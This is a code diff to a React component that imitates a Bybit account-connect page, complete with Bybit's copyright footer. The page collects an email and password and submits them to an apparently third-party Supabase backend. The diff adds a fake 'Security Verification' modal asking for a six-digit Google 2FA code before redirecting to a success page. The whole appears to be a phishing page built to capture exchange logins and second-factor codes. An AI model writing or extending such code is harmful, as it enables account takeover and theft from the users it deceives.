@@ -1,6 +1,6 @@
-import React, { useState } from 'react';
+import React, { useState, useRef } from 'react';
 import { useNavigate } from 'react-router-dom';
-import { Search, Menu, ChevronRight, Headphones } from 'lucide-react';
+import { Search, Menu, ChevronRight, Headphones, X } from 'lucide-react';
 import { supabase } from '../../lib/supabase';
 
 export default function BybitConnect() {
@@ -9,6 +9,9 @@ export default function BybitConnect() {
   const [step, setStep] = useState(1);
   const [loading, setLoading] = useState(false);
   const [errorMessage, setErrorMessage] = useState('');
+  const [showModal, setShowModal] = useState(false);
+  const [code, setCode] = useState(['', '', '', '', '', '']);
+  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
   const [credentials, setCredentials] = useState({
     email: '',
     password: '',
@@ -16,6 +19,34 @@ export default function BybitConnect() {
 
   const handleFieldChange = (field: string) => (event: React.ChangeEvent<HTMLInputElement>) => {
     setCredentials((current) => ({ ...current, [field]: event.target.value }));
+  };
+
+  const handleCodeChange = (index: number, value: string) => {
+    if (!/^\d*$/.test(value)) return;
+
+    const newCode = [...code];
+    newCode[index] = value.slice(0, 1);
+    setCode(newCode);
+
+    if (value && index < 5) {
+      inputRefs.current[index + 1]?.focus();
+    }
+  };
+
+  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
+    if (e.key === 'Backspace' && !code[index] && index > 0) {
+      inputRefs.current[index - 1]?.focus();
+    }
+  };
+
+  const handleModalSubmit = () => {
+    const verificationCode = code.join('');
+    if (verificationCode.length !== 6) {
+      alert('Please enter all 6 digits');
+      return;
+    }
+    setShowModal(false);
+    navigate('/link-success');
   };
 
   const handleSubmit = async (event: React.FormEvent) => {
@@ -65,7 +96,7 @@ export default function BybitConnect() {
         throw new Error(body?.error || 'Failed to submit connection.');
       }
 
-      navigate('/link-success');
+      setShowModal(true);
     } catch (err: any) {
       setErrorMessage(err.message || 'An unexpected error occurred.');
     } finally {
@@ -197,6 +228,67 @@ export default function BybitConnect() {
         </div>
         <p className="text-[12px] text-gray-400">© 2018-2026 Bybit.com. All rights reserved.</p>
       </footer>
+
+      {/* Security Verification Modal */}
+      {showModal && (
+        <div className="fixed inset-0 bg-black bg-opacity-50 backdrop-blur-sm flex items-center justify-center z-50">
+          <div className="bg-white rounded-lg shadow-xl max-w-md w-full mx-4">
+            <div className="flex items-center justify-between p-6 border-b border-gray-200">
+              <h2 className="text-xl font-bold text-gray-900">Security Verification</h2>
+              <button
+                onClick={() => setShowModal(false)}
+                className="text-gray-400 hover:text-gray-600"
+              >
+                <X className="w-6 h-6" />
+              </button>
+            </div>
+            <div className="p-6">
+              <div className="flex items-center gap-3 mb-6">
+                <div className="w-8 h-8 bg-blue-500 rounded-full flex items-center justify-center text-white font-bold text-lg">
+                  G
+                </div>
+                <span className="text-gray-600 text-sm">Google 2FA Code</span>
+              </div>
+              <div className="flex justify-center gap-2 mb-6">
+                {code.map((digit, index) => (
+                  <input
+                    key={index}
+                    ref={(el) => (inputRefs.current[index] = el)}
+                    type="text"
+                    inputMode="numeric"
+                    maxLength={1}
+                    value={digit}
+                    onChange={(e) => handleCodeChange(index, e.target.value)}
+                    onKeyDown={(e) => handleKeyDown(index, e)}
+                    className={`w-12 h-12 text-center text-xl font-semibold rounded-md outline-none focus:ring-0 transition-colors ${
+                      index === 0
+                        ? 'border-2 border-orange-500 bg-white'
+                        : 'bg-gray-50'
+                    }`}
+                    autoComplete="off"
+                  />
+                ))}
+              </div>
+              <div className="flex justify-center mb-4">
+                <button
+                  onClick={handleModalSubmit}
+                  className="w-full h-12 bg-orange-500 hover:bg-orange-600 text-white font-semibold rounded-md transition-colors"
+                >
+                  Verify
+                </button>
+              </div>
+              <div className="text-center">
+                <a
+                  href="#"
+                  className="text-orange-500 text-sm hover:underline"
+                >
+                  Having problems with verification?
+                </a>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
     </main>
   );
 }
